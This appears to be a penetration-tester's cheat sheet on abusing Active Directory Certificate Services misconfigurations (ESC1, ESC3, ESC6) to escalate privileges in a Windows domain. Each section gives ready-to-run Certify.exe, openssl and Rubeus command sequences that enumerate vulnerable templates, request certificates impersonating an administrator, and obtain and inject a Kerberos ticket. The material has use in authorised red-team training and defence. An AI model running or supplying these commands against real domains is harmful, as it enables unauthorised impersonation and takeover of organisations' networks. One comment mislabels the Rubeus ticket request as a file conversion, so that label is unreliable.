## Active Directory Certificate Services (AD-CS)

### Privilege Escalation with AD-CS Abuse

- ESC 1: Enrolle can request cert for any user
- ESC 3: Request an enrollment agent certificate and use it to request certificate on behalf of any user
- ESC 6: EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA - Request certs for any user

> **Note:** The required misconfigurations needed for the above mentioned abuses are mentioned below
1. CA grants regular/low-privileged users enrollment rights.
2. Manager approval is disabled
3. Authorization signatures are not required
4. The target template grants regular/low-privileged users enrollment rights

#### Enumerate AD CS in target forest
- `Certify.exe cas` (We can check for `Access \t Rights \t Principal` Section for enrollment rights, please note this data present in tabular format, I have mentioned `\t` above to note that the data is actally a table header and `\t` is just a tab, not a literal)

#### Enumerate AD CS Templates
- `Certify.exe find` (the switch `/vulnerable` can be used to identify vulnerable CA templates)

#### ESC1: Enrolle can request cert for any user
- To find vulnerable certificate templates for any user, we can issue the command `Certify.exe find /enrolleSuppliesSubject`
- The template will have a value `ENROLLE_SUPPLIES_SUBJECT` for `msPKI-Certificate-Name-Flag` attribute. 

`````Powershell
# Request Certificate
> Certify.exe request /ca:<CA FQDN>\<Certification Authority> /template:<CA template> /altname:<impersonate user>
# Copy and paste the certificate data to a .pem file

# Convert .pem to .pfx file
> openssl pkcs12 -in <path\to\cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <path\to\cert.pfx>

# Request TGT with Rubeus
> Rubeus.exe asktgt /user:administrator /certificate:<path\to\cert.pfx> /password:<some password> /ptt
`````

#### ESC 3: Request an enrollment agent certificate and use it to request certificate on behalf of any user

- `pkiextendedkeyusage` attribute of the vulnerable certificate should contain the value `Certificate Request Agent`.

- The `Enrollment Rights` attribute under permissions lists the users which request enrollment.
- To request and abuse a certificate, use the below snippet

- We will need another certificate template that allows domain authentication and application policy requires a certificate request agent.
    - The `Application Policies` attribute of the certfication template should contain the value `Certificate Request Agent`.
    - The `Enrollment Rights` attribute of the certfication template should contain a value for `Domain Users` group.

`````Powershell
# Find vulnberable certificate template that acts as a Certificate Request Agent
> Certify.exe find /vulnerable

# Find certificate template of which, the application policy requires a certificate request agent
> Certify.exe find 

# Request Enrollment Agent Certificate
> Certify.exe request /ca:<CA FQDN>\<Certification Authority> /template:<CA enrollment agent template>

# Convert .pem to .pfx file
> openssl pkcs12 -in <path\to\cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <path\to\enroll-agent-cert.pfx>

# Request a certificate using the Enrollment Certificate
> Certify.exe request /ca:<CA FQDN>\<Certification Authority> /template:<CA template> /onbehalfof:<impersonate user> /enrollcert:<path\to\enroll-agent-cert.pfx> /enrollcertpw:<some password>

# Convert .pem to .pfx file
> openssl pkcs12 -in <path\to\cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <path\to\cert.pfx>

# Convert .pem to .pfx file (with Rubeus.exe)
> Rubeus.exe asktgt /user:administrator /certificate:<path\to\cert.pfx> /password:<some password> /ptt
`````

#### ESC 6: EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA - Request certs for any user
In the enumeration phase of AD-CS with `Certify.exe cas`, we found the details of the Certification Authority. 

- If the `UserSpecifiedSAN` attribute of the CA is set to `EDITF_ATTRIBUTESUBJECTALTNAME2`, then the CA is vulnerable to ESC6 Privilege Escalation Attacks.

- We can request a certificate for any user from a template that allow enrollment for normal/low-privileged users.

`````powershell
# Find certificate template of which allows enrollment rights for low-privileged\domain users\users to a group which current user belong
> Certify.exe find 

# Request certificate
Certify.exe request /ca:<CA FQDN>\<Certification Authority> /template:<CA template> /altname:<impersonate user>

# Convert .pem to .pfx file
> openssl pkcs12 -in <path\to\cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <path\to\cert.pfx>

# Request TGT with Rubeus
> Rubeus.exe asktgt /user:administrator /certificate:<path\to\cert.pfx> /password:<some password> /ptt
`````